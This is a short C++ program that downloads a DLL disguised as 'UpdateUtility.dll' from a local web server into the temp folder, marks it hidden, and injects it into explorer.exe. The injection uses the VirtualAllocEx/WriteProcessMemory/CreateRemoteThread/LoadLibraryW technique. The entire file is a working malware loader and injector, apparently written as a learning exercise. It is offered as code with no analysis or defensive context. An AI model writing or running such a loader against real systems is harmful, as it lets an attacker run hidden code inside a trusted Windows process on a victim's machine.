/*
Jake McLellan
Gets the PID of explorer.exe by name and attempts to inject DLL at {dllPath} into it using VirtualAllocEx/WriteProcessMemory/CreateRemoteThread method
*/
#include <Windows.h>
#include <tlhelp32.h>
#include<iostream>
#include <vector>
#include <processthreadsapi.h>
#include <fileapi.h>
#pragma comment(lib, "urlmon.lib")

//Returns the handle of process by name {toFind}
HANDLE getExplorer(std::string toFind) {
	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hTH32, &procEntry);
	do
	{
		std::wstring ws(procEntry.szExeFile);
		std::string str(ws.begin(), ws.end());
		if (str.compare(toFind) == 0) {
			//std::cout << "Process " << toFind << " found: " << procEntry.th32ProcessID << "\n";
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, procEntry.th32ProcessID);
			return hProcess;
		}
	} while (Process32Next(hTH32, &procEntry));
	return NULL;
}


int main() {
//int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	HANDLE processHandle;
	PVOID remoteBuffer;

	//Get temporary path
	const int BUFLEN = 1024;
	wchar_t tmpPath[BUFLEN];
	GetTempPathW(BUFLEN, tmpPath);
	std::wstring dp = std::wstring(tmpPath);
	dp += TEXT("UpdateUtility.dll");
	const wchar_t* dllPath = dp.c_str();
	
	//Download to temp file path
	std::wstring url = TEXT("http://127.0.0.1:8000/UpdateUtility.dll");
	URLDownloadToFile(NULL, url.c_str(), dllPath, 0, NULL);
	SetFileAttributesW(dllPath, FILE_ATTRIBUTE_HIDDEN);

	//Get handle for explorer
	processHandle = getExplorer("explorer.exe");
	if (processHandle != 0) {
		//Allocate enough memory in Explorer.exe process to write the path to the DLL
		remoteBuffer = VirtualAllocEx(processHandle, NULL, dp.size() * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
		if (remoteBuffer) {
			//Write the path to explorer.exe's memory and call loadlibrary on it
			if (WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, dp.size() * sizeof(wchar_t), NULL)) {
				HMODULE hKernel32 = GetModuleHandle(TEXT("Kernel32"));
				PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
				//Create the thread and celebrate
				if (CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL) != NULL) {
					std::cout << "You did it!\n";
				}
				else
				{
					std::cout << "So close!\n";
				}
			}
			else
			{
				std::cout << "WriteProcessMemory failed\n";
			}
		}
		else {
			std::cout << "VirtualAllocEx failed\n";
		}
		CloseHandle(processHandle);
	}
	else {
		std::cout << "Unsuccessful\n";
		return -1;
	}
}